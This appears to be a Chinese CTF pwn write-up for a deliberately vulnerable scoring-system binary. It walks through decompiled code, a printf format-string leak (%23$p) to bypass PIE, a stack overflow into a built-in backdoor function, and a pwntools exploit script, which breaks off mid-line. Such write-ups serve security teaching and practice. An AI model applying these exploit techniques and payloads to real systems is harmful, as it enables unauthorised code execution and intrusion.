<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.5</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.500000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">6</span><br><span class="line">rating = 13.500000,music = 11.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.3</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.300000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.2</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.200000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">6</span><br><span class="line">rating = 13.200000,music = 11.200000</span><br><span class="line">rating = 13.300000,music = 11.300000</span><br><span class="line">rating = 13.500000,music = 11.500000</span><br></pre></td></tr></table></figure>
<p>​		似乎没啥问题。再看看 4、5 两个功能：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">4</span><br><span class="line">You can vote for what you like. You can input the name of your favorite song and cast your valuable vote</span><br><span class="line">You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)testify</span><br><span class="line">Your vote was for testify</span><br><span class="line">. Thank you for your affirmation of this spectrum, and I hope you can score smoothly</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">5</span><br><span class="line">The name of the song you voted for is:</span><br><span class="line">testify</span><br></pre></td></tr></table></figure>
<p>​		这里，总的能输入字符的感觉只有 4，其他的只有数字。</p>
<p>​		上 IDA：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> <span class="type">double</span> v3; <span class="comment">// fst7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ah] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-6h] [ebp-1Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [esp+0h] [ebp-16h] BYREF</span></span><br><span class="line">  __int16 *v8; <span class="comment">// [esp+2h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// [esp+6h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+Ah] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+Eh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  init();</span><br><span class="line">  hello();</span><br><span class="line">  *((_DWORD *)v9 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, &amp;v8, v5, v6);</span><br><span class="line">  compare(*(<span class="type">float</span> *)&amp;v8);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=======Please select the following options to use the relevant functions========&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. If the score is qualified, it will be stored in B30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Calculate single PTT&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Calculate player PTT through b30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Give your favorite song a vote&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. View voted songs&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;6. Output all content of b30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;7. Exit the system&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    v8 = &amp;v7;</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *))__isoc99_scanf)(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        setB30(v9);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        calculateMusic(v9, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = pttCalculate(v9);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your PTT is%f\n&quot;</span>, (<span class="type">double</span>)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        vote();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        output_vote(p_argc);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        test(v9);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        v10 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 != <span class="number">1</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exit the program&quot;</span>);</span><br><span class="line">  freeNode(v9);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exit successful&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you for using this scoring system&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;See you&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		找了一圈，最后在 output_vote 函数里找到了一个 printf (dest)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">output_vote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !votes )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t voted yet\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The name of the song you voted for is:&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		这个可以用来泄露 main 的地址，绕过 PIE，关键是 strcpy，存在 name 这个变量，但是上面没定义，因为在 bss 段上，根据这个变量，看看哪里调用了它，最后在 vote 里调用了两次：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( votes &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already cast 3 times, you cannot cast anymore&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;If you still want to vote, I suggest restarting this system, as it doesn&#x27;t have a memory function anyway &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can vote for what you like. You can input the name of your favorite song and cast your valuable vote&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any pr&quot;</span></span><br><span class="line">      <span class="string">&quot;oblems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;name, <span class="number">0x60</span>u);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;Your vote was for %s. Thank you for your affirmation of this spectrum, and I hope you can score smoothly\n&quot;</span>,</span><br><span class="line">      &amp;name);</span><br><span class="line">    <span class="keyword">return</span> ++votes;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		这里有个 read：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;name, <span class="number">0x60</span>u);</span><br></pre></td></tr></table></figure>
<p>​		回去一下，output_vote 函数中，将 name 变量塞进了 dest 里，但 dest 似乎不够大，存在栈溢出，但 gdb 调一下之后，发现其实长度不是特别大，不够 ROP（可能稍微大了，不过懒得改了），这里就可以打栈迁移了，随意，不过，预期解是 libc，常规 libc，因为多找找，能找到这个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">evaluate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-8h] [ebp-150h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-4h] [ebp-14Ch]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+Ch] [ebp-13Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">52</span>]; <span class="comment">// [esp+110h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You cannot call this function unless you have authorization&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So?How are you?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(buf, <span class="string">&quot;g01den&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO,you can&#x27;t do it&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK,Only I can give myself advice&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;plz input the count of your advice&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes, v1, v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">256</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No ,don&#x27;t hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, v4, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		这个函数是我预留的一个后门算是后门吧，想办法劫持数据流过来吧，不过得先泄露 main。</p>
<p>​		main 的某个偏移是 <code>%23$p</code> ，这里泄露出来的是这个地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000146A                 call    output_vote     ; jumptable 00001414 case 5</span><br><span class="line">.text:0000146F                 jmp     short _L3       ; jumptable 00001414 default case, case 0</span><br></pre></td></tr></table></figure>
<p>​		之后真实地址减去偏移得到了 elf 的基地址，之后就可以拿到 evaluate 的地址和其他 plt 和 got 表的地址，之后就常规的 libc3 了。泄露 puts 真实地址，然后获得 libc_base 地址，之后拿 binsh 和 system。</p>
<p>​		exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;154.64.254.169&quot;</span>,<span class="number">33185</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;11.0&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;AAAAAAAA%23$p&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">    main_146F = io.recv(<span class="number">10</span>)</span><br><span class="line">    main_addr = <span class="built_in">hex</span>(<span class="built_in">int</span>(main_146F,<span class="number">16</span>) - <span class="number">456</span>)</span><br><span class="line">    log.success(<span class="string">&quot;main_146F = &quot;</span> + <span class="built_in">str</span>(main_146F.decode()))</span><br><span class="line">    log.success(<span class="string">&quot;main_addr = &quot;</span> + <span class="built_in">str</span>(main_addr))</span><br><span class="line">    </span><br><span class="line">    offset = <span class="number">0x4c</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    main_addr = <span class="built_in">int</span>(main_addr,<span class="number">16</span>)</span><br><span class="line">    backdoor = main_addr + <span class="number">0x1DDE</span> - <span class="number">0x12A7</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * offset + p32(backdoor)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;So?How are you?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;g01den\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;plz input the count of your 